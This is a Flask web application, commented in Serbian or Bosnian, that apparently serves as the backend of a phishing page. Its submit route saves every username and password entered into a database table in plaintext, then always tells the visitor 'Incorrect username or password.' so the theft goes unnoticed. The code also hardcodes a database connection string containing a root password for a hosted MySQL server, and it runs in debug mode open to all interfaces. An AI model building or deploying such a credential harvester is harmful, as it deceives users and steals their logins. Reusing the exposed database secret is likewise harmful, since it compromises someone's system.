import os
from flask import Flask, render_template, request, jsonify, redirect
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)

# ✅ Povezivanje sa Railway bazom
DATABASE_URL = os.getenv('DATABASE_URL', 'mysql+pymysql://root:GvPDvyLfNaSvaXQiEBXiUWroZvvMwJPU@hopper.proxy.rlwy.net:48619/railway')
app.config['SQLALCHEMY_DATABASE_URI'] = DATABASE_URL
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.secret_key = os.urandom(24)

# ✅ Inicijalizacija baze
db = SQLAlchemy(app)

class LoginAttempt(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(150), nullable=False)
    password = db.Column(db.String(150), nullable=False)

# ✅ Kreiranje tabele
with app.app_context():
    db.create_all()

# ✅ Index stranica
@app.route('/')
def index():
    return render_template('index.html')

# ✅ AJAX Login ruta
@app.route('/submit', methods=['POST'])
def submit():
    username = request.form.get('username')
    password = request.form.get('password')

    if not username or not password:
        return jsonify({"message": "Sva polja su obavezna!", "status": "error"})

    try:
        new_attempt = LoginAttempt(username=username, password=password)
        db.session.add(new_attempt)
        db.session.commit()
        print(f"✅ Podaci sačuvani: {username}")
    except Exception as e:
        db.session.rollback()
        print(f"❌ Greška pri upisu u bazu: {e}")

    return jsonify({"message": "Incorrect username or password.", "status": "success"})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, debug=True)
